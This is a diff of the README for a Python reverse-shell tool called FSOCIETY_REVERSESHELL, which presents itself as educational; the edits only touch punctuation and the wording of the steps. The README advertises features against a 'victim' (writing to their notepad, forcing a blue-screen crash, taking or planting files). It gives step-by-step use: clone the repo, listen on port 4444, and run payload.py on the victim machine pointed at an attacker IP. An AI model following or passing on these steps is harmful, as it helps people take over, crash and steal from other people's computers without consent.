@@ -2,13 +2,13 @@
 
 Minimalist simple reverse shell designed for educational purposes 
 
- ### OPTIONS
+ ### OPTIONS:
 
 - notepad >> write in the victim notepad
 - BSOD >> causes a BSOD to the victim
 - download / upload <files> >> download or upload victim files
 
- ### REQUIREMENTS
+ ### REQUIREMENTS:
 
 - Python 3.x
 - Socket library
@@ -17,19 +17,18 @@ step 1. install script
  ``` bash
  git clone https://github.com/S4m-Sepi0l/FSOCIETY_REVERSESHELL
 ```
-then
+after:
 ``` bash
 cd FSOCIETY_REVERSESHELL
 ```
   
-step 2. start the script
+step 2. start the script:
 ```bash
 python fs0ciety.py
 ```
 
-step 3. Listen at port 4444
+step 3. Listen at port 4444 in fs0ciety.py
 
-  
 step 4. execute the payload.py on the victim machine:
 ```bash
 python payload.py --ip [ATTACKER IP] --port [PORT] (default 4444)
